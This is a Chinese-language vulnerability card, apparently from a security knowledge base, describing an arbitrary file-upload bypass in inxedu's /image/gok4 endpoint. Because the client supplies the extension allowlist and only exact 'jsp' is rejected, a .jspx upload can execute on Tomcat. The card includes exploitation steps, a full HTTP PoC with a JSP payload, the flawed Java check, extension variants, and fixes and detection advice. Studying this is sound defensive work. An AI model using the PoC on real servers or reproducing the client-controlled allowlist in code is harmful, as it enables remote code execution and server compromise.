---
id: web-generic-file-upload-inxedu-gok4-client-filetype-jspx
title: inxedu 上传接口 gok4：允许列表来自请求参数 fileType 且只排除精确 jsp，上传 images.jspx 落 Web 目录
type: scenario
domain: web
path: web/generic/file-upload
technique: file-upload-inxedu-gok4-client-allowlist-jspx
tags:
- file-upload
- java
- tomcat
- jspx
- allowlist-bypass
- inxedu
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V555
  verified_at: '2026-11-12T00:19:00+08:00'
  notes: 已通读原文并逐张核读20张图：图11 POST /image/gok4?param=online&fileType=jspx,gif,png,jpeg&pressText=undefined（管理员Cookie），multipart filename=images.jspx，响应 {"error":0,"message":"上传成功","url":"/images/upload/online/20240204/1707037193213.jspx"}，与卡内 PoC/响应逐字一致；图12 调试器显示 maxSize=4096000、fileType.split(",") 后 fileType=["jspx","gif","png","jpeg"]、ext="jspx"、判断为 fileType.contains(ext) && !"jsp".equals(ext)、filePath=/images/upload/online/20240204/1707037193213.jspx 后 transferTo，与卡内代码片段一致；客户端可控白名单与仅排除精确 jsp 的绕过机制成立。原文确无访问 .jspx 的执行截图，卡内一句话结论、原理、边界与 confidence=medium 均已如实注明执行依赖 Tomcat 默认 *.jspx→JspServlet 映射，边界说明属实。dedup 三个 related（multipart-filename 直信 filename、trailing-space 黑名单未 trim、upload1 filename 穿越）机制均不同，非同一链；dup-scan 无配对。未验证点：未本机复跑上传、未验证 JSPX 实际执行。原文未标版本，不设 affected_versions；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/web/generic/file-upload/web-generic-file-upload-inxedu-gok4-client-filetype-jspx/
draft: false
kb_aliases:
- inxedu 任意文件上传
- 因酷 gok4 上传
- fileType 参数控制白名单
- jspx 上传绕过 jsp 过滤
- /image/gok4 上传
---

## 一句话结论

inxedu 的通用上传接口 `POST /image/gok4` 把**允许的扩展名列表直接取自请求参数 `fileType`**，且代码只用 `!"jsp".equals(ext)` 排除精确的 `jsp`；攻击者传 `fileType=jspx,gif,png,jpeg` 并把文件名写成 `images.jspx`，即可通过校验把文件落到 `/images/upload/online/<日期>/<时间戳>.jspx`；Tomcat 默认把 `*.jspx` 映射给 JspServlet，落地的 JSPX 可直接执行（原文未附访问执行截图，属按容器默认行为推断）。

## 原理

- **白名单来自不可信输入**：`gok4()` 中 `String[] type = fileType.split(","); this.setFileTypeList(type);`，`fileType` 是 `@RequestParam` 请求参数，并非服务端固定配置。校验条件 `if (fileType.contains(ext) && !"jsp".equals(ext))` 只要求「原始文件后缀出现在攻击者自己提供的 fileType 字符串里」，同时后缀不等于字面量 `jsp`。
- **只排除精确 jsp**：`equals("jsp")` 是精确比较，`jspx`、`jspf`、`jspi` 等变体都不等于 `jsp`，全部放行；而 Tomcat 的默认 `web.xml` 中 JspServlet 同时映射 `*.jsp` 与 `*.jspx`，因此 `.jspx` 与 `.jsp` 一样会被编译执行。
- **落盘路径可预期**：`String filePath = this.getPath(request, ext, param)` 使用原始后缀拼接 `/images/upload/<param>/<日期>/<时间戳>.<ext>`，上传成功后响应 JSON 直接返回该 URL，攻击者无需猜路径。
- **通用上传服务**：原文指出后端几乎所有文件上传都走这个接口服务，因此一处绕过等于所有上传点可写可执行文件；`getSuffix` 取原始文件名后缀（调试器显示 `ext = "jspx"`），文件名可控。
- **为什么能 RCE**：上传目录位于 Web 根内且容器会把 jspx 当 JSP 编译；只要文件内容为合法 JSP 代码，访问返回的 URL 即执行。原文未展示访问执行截图，最终执行依赖 Tomcat 映射配置，标 confidence: medium。

## 触发条件

- 目标为 inxedu（因酷在线教育）开源版，存在 `/image/gok4` 上传接口（`param=online` 等参数）。
- 上传文件大小 ≤ 4MB（`maxSize=4096000`）。
- 请求中可控制 `fileType` 参数与 multipart 文件名。
- Web 容器为 Tomcat 且保留默认 `*.jspx` → JspServlet 映射；上传目录可被 Web 访问。

## 利用步骤

1. 登录后台（或找到可未授权访问的上传入口），进入「网站信息-基本配置-ico」等使用 gok4 上传的位置，抓包。
2. 构造 multipart 请求：URL 带 `param=online&fileType=jspx,gif,png,jpeg`，文件字段名 `uploadfile`，文件名 `images.jspx`，内容为 JSP 代码。
3. 发送后响应 `{"error":0,"message":"上传成功","url":"/images/upload/online/<日期>/<时间戳>.jspx"}`。
4. 访问该 URL，若容器按 JSP 解析则代码执行；如不执行，换 `jspf/jspi` 等其它未被精确排除的后缀测试容器映射。

## PoC

```http
POST /image/gok4?param=online&fileType=jspx,gif,png,jpeg&pressText=undefined HTTP/1.1
Host: 127.0.0.1:81
Cookie: JSESSIONID=<...>; inxedulogin_sys_user_=inxedulogin_sys_user_1
Content-Type: multipart/form-data; boundary=----26390648522763031410752956221

------26390648522763031410752956221
Content-Disposition: form-data; name="uploadfile"; filename="images.jspx"
Content-Type: image/jpeg

<%@ page import="java.util.*,java.io.*"%><% out.println("pwn"); %>
------26390648522763031410752956221--
```

```json
{"error":0,"message":"上传成功","url":"/images/upload/online/20240204/1707037193213.jspx"}
```

对应的脆弱的服务端判断（调试截图）：

```java
String[] type = fileType.split(",");              // fileType 来自请求
this.setFileTypeList(type);
String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename()); // "jspx"
if (fileType.contains(ext) && !"jsp".equals(ext)) {  // jspx != jsp，放行
    uploadFile.transferTo(file);
    this.responseData(filePath, 0, "上传成功", response);
}
```

## 变体与关联

- 变体：`ext` 换成 `jspf`、`jspi`、`jspx` 等 Tomcat 可能映射的后缀；或利用大小写/尾部点/空格等文件系统归一化差异。
- 关联：[[web-generic-file-upload-extension-blacklist-trailing-space]]（同为扩展名精确比较缺陷）、[[web-generic-file-upload-jar-meta-inf-resources-jsp-carrier]]（另一类 JSP 落地执行方式）。
- 边界：若容器未映射 `*.jspx` 或上传目录关闭脚本解析，则只能得到任意文件上传，不能直接 RCE；原文未附执行截图。

## 检测与防御

- 修复：允许扩展名必须服务端硬编码白名单（图片仅 gif/png/jpg/jpeg），用后缀与 MIME、文件头双重校验；禁止客户端传入 `fileType`/`param` 影响校验逻辑；上传文件重命名为随机名并去除可执行后缀。
- 加固：上传目录移出 Web 根或关闭脚本解析（Tomcat 对上传目录禁用 JspServlet 映射）；限制上传文件大小；对 `.jspx/.jspf/.jspi` 等 JSP 变体后缀统一拦截。
- 检测：审计上传代码中「白名单/黑名单变量来自 request」的模式；监控 Web 目录新增 `.jspx/.jspf` 等文件；WAF 对 multipart filename 中的 jsp 变体后缀告警。
